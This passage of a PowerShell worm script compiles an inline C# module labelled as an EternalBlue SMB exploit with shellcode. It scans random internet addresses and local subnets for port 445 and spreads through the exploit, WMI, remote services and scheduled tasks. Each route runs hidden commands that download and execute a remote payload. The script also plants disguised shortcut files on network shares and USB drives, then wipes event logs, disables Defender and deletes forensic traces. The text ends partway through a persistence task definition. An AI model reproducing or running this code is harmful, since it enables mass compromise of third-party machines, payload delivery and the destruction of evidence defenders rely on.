  "start_time": "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
}
"@
[System.IO.File]::WriteAllText($STATUS_FILE, $statusInit, (New-Object System.Text.UTF8Encoding $false))

# --- Compile EternalBlue Exploit Inline ---
Show ".." "Compiling EternalBlue exploit module (inline C#)..."
 $ebExe = "$BASE\eb_exploit.exe"
 $ebReady = $false

# Fixed C# source: array count fixed to 116, path scope fixed
 $ebSource = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace EBExploit {
    class Program {
        static void Main(string[] args) {
            if (args.Length < 2) return;
            try { Exploit(args[0], args[1]); } catch {}
        }
        
        static void Exploit(string targetIP, string payloadCmd) {
            TcpClient tcp = new TcpClient();
            tcp.Connect(targetIP, 445);
            NetworkStream stream = tcp.GetStream();
            stream.ReadTimeout = 10000;
            stream.WriteTimeout = 10000;
            
            // SMB Negotiate
            byte[] negotiate = new byte[116] {
                0x00, 0x00, 0x00, 0x72, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00,
                0x00, 0x18, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            stream.Write(negotiate, 0, negotiate.Length);
            Thread.Sleep(500);
            byte[] resp = new byte[8192];
            int read = stream.Read(resp, 0, resp.Length);
            if (read < 32) { tcp.Close(); return; }
            ushort procID = BitConverter.ToUInt16(resp, 26);
            
            // Session Setup (anonymous)
            byte[] sessionSetup = new byte[139];
            sessionSetup[0] = 0x00; sessionSetup[1] = 0x00; sessionSetup[2] = 0x00; sessionSetup[3] = 0x8B;
            sessionSetup[4] = 0xFF; sessionSetup[5] = 0x53; sessionSetup[6] = 0x4D; sessionSetup[7] = 0x42;
            sessionSetup[8] = 0x73; sessionSetup[9] = 0x00; sessionSetup[10] = 0x00; sessionSetup[11] = 0x00;
            sessionSetup[12] = 0x00; sessionSetup[13] = 0x18; sessionSetup[14] = 0x07; sessionSetup[15] = 0xC8;
            sessionSetup[26] = (byte)(procID & 0xFF); sessionSetup[27] = (byte)(procID >> 8);
            sessionSetup[30] = 0xFF; sessionSetup[31] = 0xFE; sessionSetup[35] = 0x0D;
            stream.Write(sessionSetup, 0, sessionSetup.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            if (read < 35) { tcp.Close(); return; }
            uint sessionID = BitConverter.ToUInt32(resp, 28);
            
            // Tree Connect IPC$             string treePath = @"\\" + targetIP + @"\IPC$";
            byte[] pathBytes = Encoding.Unicode.GetBytes(treePath);
            byte[] treeConnect = new byte[107 + pathBytes.Length];
            treeConnect[4] = 0xFF; treeConnect[5] = 0x53; treeConnect[6] = 0x4D; treeConnect[7] = 0x42;
            treeConnect[8] = 0x75; treeConnect[9] = 0x00; treeConnect[10] = 0x00; treeConnect[11] = 0x00;
            treeConnect[12] = 0x00; treeConnect[13] = 0x18; treeConnect[14] = 0x07; treeConnect[15] = 0xC8;
            treeConnect[26] = (byte)(procID & 0xFF); treeConnect[27] = (byte)(procID >> 8);
            treeConnect[28] = (byte)(sessionID & 0xFF); treeConnect[29] = (byte)((sessionID >> 8) & 0xFF);
            treeConnect[30] = (byte)((sessionID >> 16) & 0xFF); treeConnect[31] = (byte)((sessionID >> 24) & 0xFF);
            int offset = 36;
            treeConnect[offset++] = 0x04; treeConnect[offset++] = 0xFF;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x01; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = (byte)(pathBytes.Length + 2); treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x04;
            Array.Copy(pathBytes, 0, treeConnect, offset, pathBytes.Length);
            offset += pathBytes.Length;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            int totalLen = offset;
            treeConnect[0] = 0x00; treeConnect[1] = 0x00; treeConnect[2] = 0x00; treeConnect[3] = (byte)(totalLen - 4);
            stream.Write(treeConnect, 0, totalLen);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort treeID = BitConverter.ToUInt16(resp, 24);
            
            // Open srvsvc pipe
            byte[] pipeOpen = new byte[155];
            pipeOpen[0] = 0x00; pipeOpen[1] = 0x00; pipeOpen[2] = 0x00; pipeOpen[3] = 0x9B;
            pipeOpen[4] = 0xFF; pipeOpen[5] = 0x53; pipeOpen[6] = 0x4D; pipeOpen[7] = 0x42;
            pipeOpen[8] = 0xA2; pipeOpen[9] = 0x00; pipeOpen[10] = 0x00; pipeOpen[11] = 0x00;
            pipeOpen[12] = 0x00; pipeOpen[13] = 0x18; pipeOpen[14] = 0x07; pipeOpen[15] = 0xC8;
            pipeOpen[24] = (byte)(treeID & 0xFF); pipeOpen[25] = (byte)(treeID >> 8);
            pipeOpen[26] = (byte)(procID & 0xFF); pipeOpen[27] = (byte)(procID >> 8);
            pipeOpen[28] = (byte)(sessionID & 0xFF); pipeOpen[29] = (byte)((sessionID >> 8) & 0xFF);
            pipeOpen[30] = (byte)((sessionID >> 16) & 0xFF); pipeOpen[31] = (byte)((sessionID >> 24) & 0xFF);
            pipeOpen[34] = 0x18; pipeOpen[35] = 0xFF;
            pipeOpen[42] = 0x00; pipeOpen[43] = 0x10;
            pipeOpen[63] = 0x08; pipeOpen[64] = 0x00;
            pipeOpen[65] = 0x06; pipeOpen[66] = 0x00;
            pipeOpen[67] = 0x73; pipeOpen[68] = 0x00; pipeOpen[69] = 0x72; pipeOpen[70] = 0x00;
            pipeOpen[71] = 0x76; pipeOpen[72] = 0x00; pipeOpen[73] = 0x73; pipeOpen[74] = 0x00;
            pipeOpen[75] = 0x76; pipeOpen[76] = 0x00; pipeOpen[77] = 0x63; pipeOpen[78] = 0x00;
            stream.Write(pipeOpen, 0, pipeOpen.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort fid = BitConverter.ToUInt16(resp, 42);
            
            // Kernel pool grooming
            for (int i = 0; i < 16; i++) {
                byte[] groom = new byte[256];
                int go = 4;
                groom[go++] = 0xFF; groom[go++] = 0x53; groom[go++] = 0x4D; groom[go++] = 0x42;
                groom[go++] = 0x32; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x18; groom[go++] = 0x07; groom[go++] = 0xC8;
                go += 8;
                groom[go++] = (byte)(treeID & 0xFF); groom[go++] = (byte)(treeID >> 8);
                groom[go++] = (byte)(procID & 0xFF); groom[go++] = (byte)(procID >> 8);
                groom[go++] = (byte)(sessionID & 0xFF); groom[go++] = (byte)((sessionID >> 8) & 0xFF);
                groom[go++] = (byte)((sessionID >> 16) & 0xFF); groom[go++] = (byte)((sessionID >> 24) & 0xFF);
                go += 4;
                groom[go++] = (byte)(fid & 0xFF); groom[go++] = (byte)(fid >> 8);
                groom[go++] = 0x10; groom[go++] = 0x00; groom[go++] = 0x10; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                for (int j = 0; j < 200; j++) { groom[go++] = (byte)(i + j); }
                int gl = go; groom[0] = 0x00; groom[1] = 0x00; groom[2] = (byte)((gl - 4) & 0xFF); groom[3] = (byte)((gl - 4) >> 8);
                stream.Write(groom, 0, gl);
                Thread.Sleep(50);
                stream.Read(resp, 0, resp.Length);
            }
            
            // Overflow trigger — oversized FEA list
            byte[] cmdBytes = Encoding.ASCII.GetBytes(payloadCmd);
            byte[] shellcode = new byte[256 + cmdBytes.Length];
            int sc = 0;
            shellcode[sc++] = 0x65; shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x04; shellcode[sc++] = 0x25;
            shellcode[sc++] = 0x60; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x48; shellcode[sc++] = 0x18;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x59; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xD9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xC1; shellcode[sc++] = 0x38;
            shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x09;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xF6; shellcode[sc++] = 0xAC;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31;
            shellcode[sc++] = 0xC0; shellcode[sc++] = 0xAC; shellcode[sc++] = 0x48; shellcode[sc++] = 0x01;
            shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7;
            shellcode[sc++] = 0xE2; shellcode[sc++] = 0xAF; shellcode[sc++] = 0x57; shellcode[sc++] = 0xFF;
            shellcode[sc++] = 0xE7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xC9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xEC; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x01; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x8D; shellcode[sc++] = 0x0C; shellcode[sc++] = 0x24; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x89; shellcode[sc++] = 0x44; shellcode[sc++] = 0x24; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xD2; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x87; shellcode[sc++] = 0x02; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xD0;
            Array.Copy(cmdBytes, 0, shellcode, sc, cmdBytes.Length);
            sc += cmdBytes.Length;
            shellcode[sc++] = 0x00;
            byte[] result = new byte[sc];
            Array.Copy(shellcode, 0, result, 0, sc);
            
            int feaListSize = 65536;
            byte[] overflowPkt = new byte[feaListSize + 256 + result.Length];
            int po = 4;
            overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0x53; overflowPkt[po++] = 0x4D; overflowPkt[po++] = 0x42;
            overflowPkt[po++] = 0x32; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x18; overflowPkt[po++] = 0x07; overflowPkt[po++] = 0xC8;
            po += 8;
            overflowPkt[po++] = (byte)(treeID & 0xFF); overflowPkt[po++] = (byte)(treeID >> 8);
            overflowPkt[po++] = (byte)(procID & 0xFF); overflowPkt[po++] = (byte)(procID >> 8);
            overflowPkt[po++] = (byte)(sessionID & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 8) & 0xFF);
            overflowPkt[po++] = (byte)((sessionID >> 16) & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 24) & 0xFF);
            po += 4;
            overflowPkt[po++] = (byte)(fid & 0xFF); overflowPkt[po++] = (byte)(fid >> 8);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0xFF;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x01; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x0E;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            for (int i = 0; i < feaListSize / 8; i++) {
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x05;
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
                overflowPkt[po++] = (byte)('A' + (i % 26));
                overflowPkt[po++] = (byte)('A' + ((i+1) % 4));
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            }
            Array.Copy(result, 0, overflowPkt, po, result.Length);
            po += result.Length;
            int opLen = po;
            overflowPkt[0] = 0x00; overflowPkt[1] = (byte)((opLen - 4) >> 16);
            overflowPkt[2] = (byte)((opLen - 4) >> 8); overflowPkt[3] = (byte)((opLen - 4) & 0xFF);
            stream.Write(overflowPkt, 0, opLen);
            Thread.Sleep(5000);
            tcp.Close();
        }
    }
}
'@

try {
    $cscPaths = @(
        "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    )
    foreach ($csc in $cscPaths) {
        if (Test-Path $csc) {
            $srcPath = "$BASE\eb_exploit.cs"
            [System.IO.File]::WriteAllText($srcPath, $ebSource, (New-Object System.Text.UTF8Encoding $false))
            & $csc /nologo /out:"$ebExe" /unsafe /platform:x64 "$srcPath" 2>$null
            if ((Test-Path $ebExe) -and (Get-Item $ebExe).Length -gt 10000) {
                $ebReady = $true
                Show "OK" "EternalBlue exploit compiled successfully"
                break
            }
        }
    }
} catch { Show "!!" "C# compilation error" }

# ---- WORM BACKGROUND JOB ----
Show ".." "Spawning worm module in background..."
Show "OK" "Max targets: $MAX_TARGETS | Expiry: $WORM_EXPIRY"

Start-Job -ScriptBlock {
    param($base, $url, $max, $expiry, $ebExe, $ebReady, $statusFile)
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ErrorActionPreference = "SilentlyContinue"
    $ProgressPreference = "SilentlyContinue"
    
    function WLog {
        param([string]$msg)
        try { $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "$base\worm.log" -Value "[$ts] $msg" -ErrorAction SilentlyContinue } catch {}
    }
    
    function Update-Status {
        param([string]$key, $value)
        try {
            $raw = Get-Content $statusFile -Raw -ErrorAction SilentlyContinue
            $json = $raw | ConvertFrom-Json -ErrorAction SilentlyContinue
            if (-not $json) { $json = @{} }
            $json.$key = $value
            $json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            $json | ConvertTo-Json -Compress | Set-Content $statusFile -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    function Get-RandomPublicIP {
        while ($true) {
            $a = Get-Random -Minimum 1 -Maximum 255
            $b = Get-Random -Minimum 0 -Maximum 256
            $c = Get-Random -Minimum 0 -Maximum 256
            $d = Get-Random -Minimum 1 -Maximum 255

            if ($a -eq 10) { continue }
            if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { continue }
            if ($a -eq 192 -and $b -eq 168) { continue }
            if ($a -eq 127) { continue }
            if ($a -eq 169 -and $b -eq 254) { continue }
            if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { continue }
            if ($a -eq 0) { continue }
            if ($a -ge 224) { continue }
            if ($a -eq 192 -and $b -eq 0 -and $c -eq 2) { continue }
            if ($a -eq 198 -and ($b -eq 18 -or $b -eq 19)) { continue }
            if ($a -eq 198 -and $b -eq 51 -and $c -eq 100) { continue }
            if ($a -eq 203 -and $b -eq 0 -and $c -eq 113) { continue }
            if ($a -eq 192 -and $b -eq 88 -and $c -eq 99) { continue }

            return "$a.$b.$c.$d"
        }
    }
    
    function Scan-SMBHosts {
        param([int]$Count = 500)
        $openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
        
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 100)
        $runspacePool.Open()
        $jobs = [System.Collections.ArrayList]::new()

        $ipBatch = @()
        for ($i = 0; $i -lt $Count; $i++) {
            $ipBatch += Get-RandomPublicIP
        }

        WLog "Scanning $Count random internet IPs for port 445..."

        foreach ($ip in $ipBatch) {
            $ps = [PowerShell]::Create()
            $ps.RunspacePool = $runspacePool
            [void]$ps.AddScript({
                param($t)
                $tcp = New-Object System.Net.Sockets.TcpClient
                $iar = $tcp.BeginConnect($t, 445, $null, $null)
                $success = $iar.AsyncWaitHandle.WaitOne(1200, $false)
                if ($success -and $tcp.Connected) {
                    $tcp.Close()
                    return $t
                }
                try { $tcp.Close() } catch {}
                return $null
            })
            [void]$ps.AddArgument($ip)
            $job = $ps.BeginInvoke()
            $jobs.Add([PSCustomObject]@{ PowerShell = $ps; Job = $job; Target = $ip })
        }

        foreach ($j in $jobs) {
            $result = $j.PowerShell.EndInvoke($j.Job)
            if ($result -and $result[0]) {
                $openHosts.Add($result[0])
                WLog "Host $($result[0]) has port 445 open"
            }
            $j.PowerShell.Dispose()
        }

        $runspacePool.Close()
        $runspacePool.Dispose()

        WLog "Scan complete. $($openHosts.Count) hosts with port 445 open."
        return $openHosts.ToArray()
    }
    
    function Test-EBVuln {
        param([string]$ip)
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $iar = $tcp.BeginConnect($ip, 445, $null, $null)
            $success = $iar.AsyncWaitHandle.WaitOne(3000, $false)
            if (-not $success -or -not $tcp.Connected) { $tcp.Close(); return $false }
            
            $stream = $tcp.GetStream()
            $stream.WriteTimeout = 5000
            $stream.ReadTimeout = 5000
            
            $negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
            
            $stream.Write($negotiate, 0, $negotiate.Length)
            Start-Sleep -Milliseconds 500
            
            $buffer = New-Object byte[] 4096
            $read = $stream.Read($buffer, 0, $buffer.Length)
            $tcp.Close()
            
            if ($read -gt 34) {
                if (($buffer[4] -eq 0xFF) -and ($buffer[5] -eq 0x53) -and ($buffer[6] -eq 0x4D) -and ($buffer[7] -eq 0x42)) {
                    if ($buffer[34] -le 0x05) { return $true }
                }
            }
            return $false
        } catch { return $false }
    }
    
    function Invoke-EBExploit {
        param([string]$ip)
        
        $cmd = "powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$url'+[char](Get-Random -Max 9) -OutFile `"`$env:TEMP\s.ps1`" -UseBasicParsing; Start-Process powershell -ArgumentList `"-W Hidden -EP Bypass -F `"`$env:TEMP\s.ps1`"`" -WindowStyle Hidden; exit`""
        
        if ($ebReady -and (Test-Path $ebExe)) {
            WLog "Firing compiled EB exploit at $ip"
            try {
                $p = Start-Process -FilePath $ebExe -ArgumentList "`"$ip`" `"$cmd`"" -WindowStyle Hidden -PassThru -Wait
                if ($p.ExitCode -eq 0) { WLog "EB exploit executed on $ip"; return $true }
            } catch { WLog "EB exploit binary failed: $($_.Exception.Message)" }
        }
        
        WLog "Trying PS-based exploitation on $ip"
        $result = $false
        
        try {
            $remote = Invoke-WmiMethod -ComputerName $ip -Class Win32_Process -Name Create -ArgumentList $cmd -ErrorAction SilentlyContinue
            if ($remote -and $remote.ReturnValue -eq 0) { WLog "WMI succeeded on $ip"; $result = $true }
        } catch {}
        
        if (-not $result) {
            try {
                $svcName = "sys" + (Get-Random -Max 9999)
                cmd /c "sc.exe \\$ip create $svcName binPath= `"cmd /c $cmd`" 2>nul" 2>$null
                cmd /c "sc.exe \\$ip start $svcName 2>nul" 2>$null
                Start-Sleep 2
                cmd /c "sc.exe \\$ip delete $svcName 2>nul" 2>$null
                WLog "SCM attempted on $ip"; $result = $true
            } catch {}
        }
        
        if (-not $result) {
            try {
                $taskName = "SystemUpdate" + (Get-Random -Max 9999)
                cmd /c "schtasks /create /s $ip /tn $taskName /tr `"$cmd`" /sc once /st 00:00 /ru System /f 2>nul" 2>$null
                cmd /c "schtasks /run /s $ip /tn $taskName 2>nul" 2>$null
                Start-Sleep 2
                cmd /c "schtasks /delete /s $ip /tn $taskName /f 2>nul" 2>$null
                WLog "Scheduled task attempted on $ip"; $result = $true
            } catch {}
        }
        
        return $result
    }
    
    function Drop-LNK {
        param([string]$sharePath)
        $folderNames = @("Documents","Photos","Backup","Shared Files","Reports","Projects","Archive","Public","Confidential","Templates","Payroll","Invoices","Database","Source","Releases")
        $lnkName = (Get-Random -InputObject $folderNames) + ".lnk"
        $lnkPath = Join-Path $sharePath $lnkName
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $lnk = $wsh.CreateShortcut($lnkPath)
            $lnk.TargetPath = "C:\Windows\System32\cmd.exe"
            $lnk.Arguments = "/c powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$url'+[char](Get-Random -Max 9) -OutFile `"`$env:TEMP\s.ps1`" -UseBasicParsing; Start-Process powershell -ArgumentList `"-W Hidden -EP Bypass -F `"`$env:TEMP\s.ps1`"`" -WindowStyle Hidden; exit`""
            $lnk.IconLocation = "C:\Windows\System32\imageres.dll,3"
            $lnk.WindowStyle = 7
            $lnk.Save()
            WLog "LNK dropped: $lnkPath"
            return $true
        } catch { return $false }
    }
    
    function Get-Shares {
        $shares = @()
        try {
            $netView = cmd /c "net view" 2>$null
            $hosts = @()
            foreach ($line in ($netView -split "`n")) { if ($line -match "^\\\\(\S+)") { $hosts += $matches[1] } }
            foreach ($h in $hosts) {
                try {
                    $hv = cmd /c "net view \\$h" 2>$null
                    foreach ($line in ($hv -split "`n")) { if ($line -match "^(\S+)\s+Disk") { $shares += "\\$h\$($matches[1])" } }
                } catch {}
            }
        } catch {}
        try {
            $netUse = cmd /c "net use" 2>$null
            foreach ($line in ($netUse -split "`n")) { if ($line -match "(\\\\\S+)") { $shares += $matches[1] } }
        } catch {}
        try {
            $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
                Where-Object { $_.IPAddress -notmatch "^169\.254\." -and $_.IPAddress -notmatch "^127\." -and $_.PrefixOrigin -eq "Dhcp" } | 
                Select-Object -First 1).IPAddress
            if ($localIP) {
                $octets = $localIP.Split('.')
                $subnetBase = "$($octets[0]).$($octets[1]).$($octets[2])"
                foreach ($i in 1..254) {
                    $target = "$subnetBase.$i"
                    if ($target -ne $localIP) {
                        try {
                            $tcp = New-Object System.Net.Sockets.TcpClient
                            $iar = $tcp.BeginConnect($target, 445, $null, $null)
                            $success = $iar.AsyncWaitHandle.WaitOne(500, $false)
                            if ($success -and $tcp.Connected) { $shares += "\\$target\C$" }
                            $tcp.Close()
                        } catch {}
                    }
                }
            }
        } catch {}
        return $shares | Select-Object -Unique
    }
    
    function Start-USB {
        $usbVbs = @"
On Error Resume Next
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
base = "$base"
payloadUrl = "$url"
Do
    Set drives = wmi.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType=2")
    For Each drive In drives
        driveLetter = drive.DeviceID
        lnkPath = driveLetter & "\passwords.lnk"
        If Not fso.FileExists(lnkPath) Then
            vbsPath = base & "\tmp_lnk.vbs"
            Set f = fso.CreateTextFile(vbsPath, True)
            f.WriteLine "Set objShell = CreateObject(""WScript.Shell"")"
            f.WriteLine "Set objLink = objShell.CreateShortcut(""" & lnkPath & """)"
            f.WriteLine "objLink.TargetPath = ""C:\Windows\System32\cmd.exe"""
            f.WriteLine "objLink.Arguments = ""/c powershell.exe -W Hidden -EP Bypass -Command \""[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12\""; iwr '""" & payloadUrl & "'+([char](Get-Random -Max 9)) -OutFile \""$env:TEMP\s.ps1\"" -UseBasicParsing\""; Start-Process powershell -ArgumentList \""-W Hidden -EP Bypass -F \""$env:TEMP\s.ps1\"""" -WindowStyle Hidden; exit"
            f.WriteLine "objLink.IconLocation = ""C:\Windows\System32\imageres.dll,3"""
            f.WriteLine "objLink.WindowStyle = 7"
            f.WriteLine "objLink.Save"
            f.Close
            Set f = Nothing
            sh.Run "wscript " & Chr(34) & vbsPath & Chr(34), 0, True
            fso.DeleteFile vbsPath
        End If
    Next
    Set drives = Nothing
    WScript.Sleep 30000
Loop
"@
        $usbVbsPath = "$base\mf_usb.vbs"
        [System.IO.File]::WriteAllText($usbVbsPath, $usbVbs, (New-Object System.Text.UTF8Encoding $false))
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$usbVbsPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
        WLog "USB spread activated"
    }
    
    function Invoke-Cleanup {
        $cleanupVbs = @"
On Error Resume Next
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
logs = Array("Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Windows Defender/Operational")
For Each logName In logs
    sh.Run "wevtutil cl " & logName, 0, True
Next
psHist = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
If fso.FileExists(psHist) Then fso.DeleteFile psHist
psHist2 = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
If fso.FileExists(psHist2) Then fso.DeleteFile psHist2
recentDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Recent"
If fso.FolderExists(recentDir) Then
    For Each f In fso.GetFolder(recentDir).Files
        f.Delete True
    Next
End If
prefetchDir = "C:\Windows\Prefetch"
If fso.FolderExists(prefetchDir) Then
    For Each f In fso.GetFolder(prefetchDir).Files
        f.Delete True
    Next
End If
sh.Run "powershell -c ""Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue""", 0, True
sh.Run "powershell -c ""Remove-Item -Path 'C:\ProgramData\Microsoft\Windows Defender\Quarantine\*' -Recurse -Force -ErrorAction SilentlyContinue""", 0, True
sh.Run "fsutil usn deletejournal /d C:", 0, True
"@
        $cleanupPath = "$base\mf_cleanup.vbs"
        [System.IO.File]::WriteAllText($cleanupPath, $cleanupVbs, (New-Object System.Text.UTF8Encoding $false))
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$cleanupPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
        
        $cleanupXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger><TimeTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Enabled>true</Enabled><Repetition><Interval>PT30M</Interval></Repetition></TimeTrigger></Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
